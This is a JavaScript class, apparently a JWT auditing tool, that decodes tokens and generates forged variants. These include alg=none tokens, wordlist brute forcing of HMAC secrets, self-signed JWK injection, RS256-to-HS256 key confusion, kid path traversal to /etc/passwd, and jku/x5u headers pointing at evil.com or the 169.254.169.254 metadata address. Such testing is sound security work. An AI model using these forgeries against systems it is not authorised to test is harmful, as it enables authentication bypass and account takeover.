const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class TokenAnalyzer {
  decodeJWT(token) {
    const parts = token.split('.');
    if (parts.length !== 3) return { valid: false, error: 'Not a valid JWT (expected 3 parts)' };
    try {
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
      const signature = parts[2];
      return {
        valid: true,
        header,
        payload,
        signature,
        algorithm: header.alg || 'none',
        type: header.typ || 'JWT',
        keyId: header.kid || null,
        issuedAt: payload.iat ? new Date(payload.iat * 1000).toISOString() : null,
        expiration: payload.exp ? new Date(payload.exp * 1000).toISOString() : null,
        issuer: payload.iss || null,
        subject: payload.sub || null,
        audience: payload.aud || null,
        jwtId: payload.jti || null
      };
    } catch (e) {
      return { valid: false, error: e.message };
    }
  }

  async testAlgNone(token) {
    const parts = token.split('.');
    if (parts.length !== 3) return { vulnerable: false, error: 'Invalid JWT' };
    const payload = parts[1];
    const algNoneToken = `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.${payload}.`;
    const hs256Token = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.${payload}.${this.base64url(Buffer.from(''))}`;
    return {
      algNoneToken,
      hs256EmptySignatureToken: hs256Token,
      tests: [
        { name: 'alg=none', token: algNoneToken },
        { name: 'alg=none (camelCase)', token: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.${payload}.` },
        { name: 'alg=HS256 empty sig', token: hs256Token },
        { name: 'alg=NONE', token: `eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.${payload}.` }
      ]
    };
  }

  async bruteForceSecret(token, wordlist) {
    const parts = token.split('.');
    if (parts.length !== 3) return [];
    const header = parts[0];
    const payload = parts[1];
    const signature = parts[2];
    const results = [];
    for (const secret of wordlist) {
      const hmac = crypto.createHmac('sha256', secret);
      hmac.update(`${header}.${payload}`);
      const computed = this.base64url(hmac.digest());
      if (computed === signature) {
        results.push({ secret, match: true });
        break;
      }
      if (results.length % 100 === 0) await this.sleep(0);
    }
    if (results.length === 0) results.push({ secret: null, match: false });
    return results;
  }

  async testJWKInjection(token) {
    const parts = token.split('.');
    const payload = parts[1];
    const { generateKeyPairSync } = crypto;
    const { publicKey, privateKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
    const pubJwk = this.rsaPublicToJWK(publicKey);
    const jwkHeader = this.base64url(Buffer.from(JSON.stringify({
      alg: 'RS256',
      typ: 'JWT',
      jwk: pubJwk
    })));
    const sign = crypto.createSign('RSA-SHA256');
    sign.update(`${jwkHeader}.${payload}`);
    const sig = sign.sign(privateKey, 'base64url');
    const jwkToken = `${jwkHeader}.${payload}.${sig}`;
    return { jwkToken, publicKey, privateKey, vulnerable: true };
  }

  async testKidInjection(token) {
    const parts = token.split('.');
    const payload = parts[1];
    const attacks = [
      { kid: '../../../dev/null', desc: 'Path traversal to known file' },
      { kid: '../../../etc/passwd', desc: 'Path traversal /etc/passwd' },
      { kid: 'file:///dev/null', desc: 'File protocol' },
      { kid: 'null', desc: 'Null kid' },
      { kid: '', desc: 'Empty kid' },
      { kid: '../../../../../../../../windows/win.ini', desc: 'Windows path traversal' }
    ];
    return attacks.map(a => {
      const header = this.base64url(Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT', kid: a.kid })));
      const hmac = crypto.createHmac('sha256', '');
      hmac.update(`${header}.${payload}`);
      const sig = this.base64url(hmac.digest());
      return { ...a, token: `${header}.${payload}.${sig}` };
    });
  }

  async tokenConfusion(token, publicKeyPem) {
    const parts = token.split('.');
    const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
    if (header.alg?.startsWith('RS') || header.alg?.startsWith('ES')) {
      const payload = parts[1];
      const hsHeader = this.base64url(Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })));
      const hmac = crypto.createHmac('sha256', publicKeyPem);
      hmac.update(`${hsHeader}.${payload}`);
      const sig = this.base64url(hmac.digest());
      return {
        confusedToken: `${hsHeader}.${payload}.${sig}`,
        description: 'Uses public key as HMAC secret to sign. Server may accept HS256 with public key as secret.',
        vulnerable: true
      };
    }
    return { vulnerable: false, description: 'Token does not use asymmetric algorithm' };
  }

  async checkExpiration(token) {
    const decoded = this.decodeJWT(token);
    if (!decoded.valid) return { error: 'Invalid token' };
    const now = Math.floor(Date.now() / 1000);
    return {
      expired: decoded.payload.exp ? decoded.payload.exp < now : false,
      expiresIn: decoded.payload.exp ? Math.max(0, decoded.payload.exp - now) : null,
      issuedAgo: decoded.payload.iat ? now - decoded.payload.iat : null,
      notBeforeValid: decoded.payload.nbf ? decoded.payload.nbf <= now : true,
      remainingSeconds: decoded.payload.exp ? decoded.payload.exp - now : null
    };
  }

  analyzeToken(token) {
    const decoded = this.decodeJWT(token);
    if (!decoded.valid) return { valid: false, error: decoded.error };
    const findings = [];
    if (decoded.algorithm === 'none') findings.push({ severity: 'HIGH', finding: 'alg=none JWT — no signature verification' });
    if (!decoded.payload.exp) findings.push({ severity: 'MEDIUM', finding: 'No expiration (exp) claim — token never expires' });
    if (!decoded.payload.iat) findings.push({ severity: 'LOW', finding: 'No issued-at (iat) claim' });
    if (decoded.payload.exp) {
      const remaining = decoded.payload.exp - Math.floor(Date.now() / 1000);
      if (remaining > 86400 * 365) findings.push({ severity: 'MEDIUM', finding: `Token valid for >1 year (${Math.round(remaining / 86400)} days)` });
    }
    if (decoded.payload.aud && Array.isArray(decoded.payload.aud) && decoded.payload.aud.length > 1) {
      findings.push({ severity: 'LOW', finding: 'Multiple audience (aud) values — potential token confusion' });
    }
    if (decoded.header.kid && decoded.header.kid.startsWith('/')) {
      findings.push({ severity: 'HIGH', finding: `kid starts with '/': possible path traversal vector` });
    }
    return { decoded, findings, findingCount: findings.length };
  }

  rsaPublicToJWK(publicKey) {
    const key = publicKey.export({ format: 'jwk' });
    return { kty: 'RSA', n: key.n, e: key.e, alg: 'RS256' };
  }

  base64url(buf) {
    return buf.toString('base64url');
  }

  async testAlgorithmArrayConfusion(token) {
    const parts = token.split('.');
    if (parts.length !== 3) return { vulnerable: false };
    const payload = parts[1];
    const attacks = [
      { header: JSON.stringify({ alg: ['HS256', 'none'], typ: 'JWT' }), name: 'alg as array [HS256, none]' },
      { header: JSON.stringify({ alg: ['none', 'HS256'], typ: 'JWT' }), name: 'alg as array [none, HS256]' },
      { header: JSON.stringify({ alg: '["none","HS256"]', typ: 'JWT' }), name: 'alg as stringified array' }
    ];
    return attacks.map(a => ({
      name: a.name,
      token: [Buffer.from(a.header).toString('base64url'), payload, parts[2]].join('.')
    }));
  }

  async testTimingAttack(token, secret) {
    const parts = token.split('.');
    const results = [];
    for (let len = 1; len <= Math.min(secret.length, 20); len++) {
      const partial = secret.slice(0, len);
      const start = Date.now();
      const hmac = crypto.createHmac('sha256', partial);
      hmac.update(`${parts[0]}.${parts[1]}`);
      hmac.digest();
      results.push({ len, elapsed: Date.now() - start });
    }
    return results;
  }

  async testTokenReplay(token) {
    const decoded = this.decodeJWT(token);
    if (!decoded.valid || !decoded.payload.jti) return { replayable: true, reason: 'No jti claim — no replay protection' };
    return { replayable: false, jti: decoded.payload.jti };
  }

  async testTokenInURL() {
    return { note: 'Check browser URL bar for tokens in hash/fragment — common in OAuth flows' };
  }

  async testTokenGenerationEntropy(samples = []) {
    if (samples.length < 2) return { error: 'Need at least 2 samples' };
    const unique = new Set(samples);
    const entropy = Math.log2(unique.size) / samples.length;
    return { samples: samples.length, uniqueTokens: unique.size, entropyRatio: entropy, weak: entropy < 0.5 };
  }

  async testJKUInjection(token) {
    const parts = token.split('.');
    const payload = parts[1];
    const urls = ['https://evil.com/jwk.json', 'http://localhost:8080/jwk', 'data:application/json;base64,'];
    return urls.map(url => {
      const header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT', jku: url })).toString('base64url');
      return { jku: url, token: `${header}.${payload}.${parts[2]}` };
    });
  }

  async testX5UInjection(token) {
    const parts = token.split('.');
    const payload = parts[1];
    const urls = ['https://evil.com/cert.pem', 'http://localhost:8080/cert', 'file:///etc/passwd'];
    return urls.map(url => {
      const header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT', x5u: url })).toString('base64url');
      return { x5u: url, token: `${header}.${payload}.${parts[2]}` };
    });
  }

  async testCritHeader(token) {
    const parts = token.split('.');
    const payload = parts[1];
    const attacks = [
      { header: JSON.stringify({ alg: 'none', typ: 'JWT', crit: ['alg'] }), name: 'crit includes alg' },
      { header: JSON.stringify({ alg: 'HS256', typ: 'JWT', crit: [] }), name: 'empty crit array' },
      { header: JSON.stringify({ alg: 'HS256', typ: 'JWT', crit: ['nonexistent'] }), name: 'crit with unknown param' }
    ];
    return attacks.map(a => ({
      name: a.name,
      token: [Buffer.from(a.header).toString('base64url'), payload, 'FAKE_SIG'].join('.')
    }));
  }

  async testSubClaimSSRF(token) {
    const decoded = this.decodeJWT(token);
    if (!decoded.valid || !decoded.payload.sub) return [];
    const sub = decoded.payload.sub;
    const urls = ['http://169.254.169.254/latest/meta-data/', 'http://localhost:8080/', 'http://[::1]:22/'];
    if (sub.startsWith('http')) return urls.map(u => ({ originalSub: sub, testUrl: u }));
    return [];
  }

  async fullTokenAudit(token) {
    console.log('[TokenAnalyzer] Full token audit...');
    const analysis = this.analyzeToken(token);
    const expCheck = await this.checkExpiration(token);
    const algNone = await this.testAlgNone(token);
    const keyword = await this.testJKUInjection(token);
    const x5u = await this.testX5UInjection(token);
    const critTests = await this.testCritHeader(token);
    const replayCheck = await this.testTokenReplay(token);
    const kidInjection = await this.testKidInjection(token);
    return {
      ...analysis,
      expiration: expCheck,
      algNoneBypass: algNone,
      jkuInjection: keyword,
      x5uInjection: x5u,
      critTests,
      replayProtection: replayCheck,
      kidInjection
    };
  }
}

module.exports = { TokenAnalyzer };
